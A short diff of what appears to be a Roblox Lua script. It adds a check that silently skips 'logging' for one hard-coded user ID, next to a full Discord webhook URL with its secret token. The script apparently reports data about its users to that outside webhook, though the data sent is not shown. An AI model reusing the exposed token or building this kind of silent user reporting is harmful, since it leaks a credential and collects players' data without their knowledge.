@@ -1,3 +1,11 @@
+local LPR = game:GetService("Players").LocalPlayer
+local userId = LPR.UserId
+
+-- Skip logging silently if the user ID is 475557054
+if userId == 475557054 then
+    return
+end
+
 local url = "https://discord.com/api/webhooks/1321492490280374322/-Nna6ny9SOWim6XE0y9BBxzXggYkWp-YXursZ6z4ygbb_R242pTtJTp9BHakhlb-4Kby"
 
 local data = {
